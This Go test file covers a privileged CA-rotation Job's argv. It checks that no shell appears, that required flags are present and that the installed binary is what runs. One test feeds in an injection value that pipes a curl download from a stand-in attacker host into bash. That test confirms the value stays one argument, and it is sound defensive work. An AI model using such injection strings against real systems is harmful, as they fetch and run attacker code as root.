package certs

import (
	"fmt"
	"slices"
	"strings"
	"testing"

	"github.com/ctrliq/stratum/internal/version"
)

// TestCANodeArgvHasNoShell is the structural guarantee that no
// interpreter is present anywhere in the CA-rotation payload, so nothing in it
// can be re-parsed as code on the node. This Job is privileged, HostPID and
// nsenters PID 1, so a shell here is root on every node in the cluster — the
// same shell-free shape the node-upgrade Job's argv already has.
//
// A regression here re-opens that channel even though no caller passes an
// attacker-influenced phase today, which is precisely the point: the guarantee
// must not depend on the call sites staying benign.
func TestCANodeArgvHasNoShell(t *testing.T) {
	for _, phase := range []string{PhaseTrustNew, PhaseSignNew, PhaseFinalize} {
		for _, fetchShared := range []bool{false, true} {
			argv := caNodeArgv(phase, fetchShared, false)
			for i, a := range argv {
				if a == "-c" {
					t.Errorf("phase %s: argv[%d] is %q — a shell -c flag is back in the payload", phase, i, a)
				}
				for _, sh := range []string{"bash", "/bin/sh", "zsh"} {
					if strings.Contains(a, sh) {
						t.Errorf("phase %s: argv[%d] = %q contains a shell (%q)", phase, i, a, sh)
					}
				}
			}
			if got := argv[9]; !strings.HasSuffix(got, "/stratum") {
				t.Errorf("phase %s: exec target = %q, want the on-host stratum binary itself", phase, got)
			}
		}
	}
}

// Hostile values must land as ONE argv element and never be split, concatenated
// or interpreted. Nothing routes an untrusted phase here today; this asserts the
// payload layer is safe on its own, so it does not silently become the only
// control if a future caller does.
func TestCANodeArgvKeepsHostileValuesAsSingleElements(t *testing.T) {
	const evil = "finalize; curl http://attacker/x | bash"
	argv := caNodeArgv(evil, false, false)

	idx := -1
	for i, a := range argv {
		if a == "--phase" {
			idx = i + 1
		}
	}
	if idx < 0 || idx >= len(argv) {
		t.Fatal("no --phase in argv")
	}
	if argv[idx] != evil {
		t.Errorf("--phase value = %q, want the payload intact in exactly one element", argv[idx])
	}
	for i, a := range argv {
		if i != idx && strings.Contains(a, "curl") {
			t.Errorf("argv[%d] = %q — the payload leaked into another element", i, a)
		}
	}
}

// The flags the orchestrator depends on must actually be present: --yes because
// rotate-ca refuses without it, and --fetch-shared only on the follower
// trust-new leg that needs the initiator's staged material.
func TestCANodeArgvCarriesTheRequiredFlags(t *testing.T) {
	has := func(argv []string, flag string) bool {
		for _, a := range argv {
			if a == flag {
				return true
			}
		}
		return false
	}

	plain := caNodeArgv(PhaseTrustNew, false, false)
	if !has(plain, "--yes") {
		t.Error("no --yes: rotate-ca refuses to run without it, so the Job would fail on every node")
	}
	if has(plain, "--fetch-shared") {
		t.Error("--fetch-shared present when not asked for; a node would pull staged CA material it should not")
	}

	shared := caNodeArgv(PhaseTrustNew, true, false)
	if !has(shared, "--fetch-shared") {
		t.Error("no --fetch-shared when requested; a follower control plane would rotate without the initiator's CA material")
	}
	if has(shared, "--force") {
		t.Error("--force present when not asked for")
	}
	if !has(caNodeArgv(PhaseTrustNew, true, true), "--force") {
		t.Error("no --force on a forced rotation's trust-new; a follower that lost the old keys too would refuse it")
	}
	for _, phase := range []string{PhaseSignNew, PhaseFinalize} {
		if has(caNodeArgv(phase, false, true), "--force") {
			t.Errorf("--force on %s; only trust-new takes it", phase)
		}
	}
}

// The Job execs the stratum installed on the node. BinDir holds the payload's
// binaries and never stratum, so a Job that ran BinDir/stratum failed on every
// node but the initiator, and a rollback stopped halfway.
func TestCANodeArgvExecsTheInstalledStratum(t *testing.T) {
	argv := caNodeArgv(PhaseTrustNew, false, false)
	i := slices.Index(argv, "--")
	if i < 0 || i+1 >= len(argv) {
		t.Fatalf("argv has no binary after --: %v", argv)
	}
	if got := argv[i+1]; got != version.StratumInstallPath {
		t.Errorf("Job execs %q, want the installed stratum %q", got, version.StratumInstallPath)
	}
	if strings.HasPrefix(argv[i+1], version.BinDir) {
		t.Errorf("Job execs stratum from the payload dir %s, which has no stratum", version.BinDir)
	}
}

// Finalize on a node is not gated on mounted tokens again: the orchestrator
// checked every node before the first finalized, and a refusal here would halt
// the rotation after the old key was already dropped elsewhere. No other phase
// takes the flag, and the operator's --skip-token-check (which needs --force)
// is never what the Job passes.
func TestCANodeArgvMarksTokensCheckedOnlyInFinalize(t *testing.T) {
	for _, phase := range []string{PhaseTrustNew, PhaseSignNew, PhaseFinalize} {
		argv := caNodeArgv(phase, false, false)
		if got, want := slices.Contains(argv, "--tokens-checked"), phase == PhaseFinalize; got != want {
			t.Errorf("phase %s: --tokens-checked present = %v, want %v", phase, got, want)
		}
		if slices.Contains(argv, "--skip-token-check") || slices.Contains(argv, "--force") {
			t.Errorf("phase %s: argv %v carries the operator's recovery flags", phase, argv)
		}
	}
}

// TestTrustNewOthersPassesForceToControlPlanesOnly: the other control planes
// fetch the staged material and take the run's --force, so one that lost the
// same key goes ahead; a worker takes neither.
func TestTrustNewOthersPassesForceToControlPlanesOnly(t *testing.T) {
	for _, force := range []bool{false, true} {
		var got []string
		err := trustNewOthers([]cnode{{Name: "cp2", IsCP: true}}, []cnode{{Name: "w1"}}, force,
			func(string) error { return nil },
			func(n cnode, fetchShared, f bool) error {
				got = append(got, fmt.Sprintf("%s fetch=%v force=%v", n.Name, fetchShared, f))
				return nil
			})
		if err != nil {
			t.Fatal(err)
		}
		want := []string{fmt.Sprintf("cp2 fetch=true force=%v", force), "w1 fetch=false force=false"}
		if !slices.Equal(got, want) {
			t.Errorf("force=%v: ran %q, want %q", force, got, want)
		}
	}
}
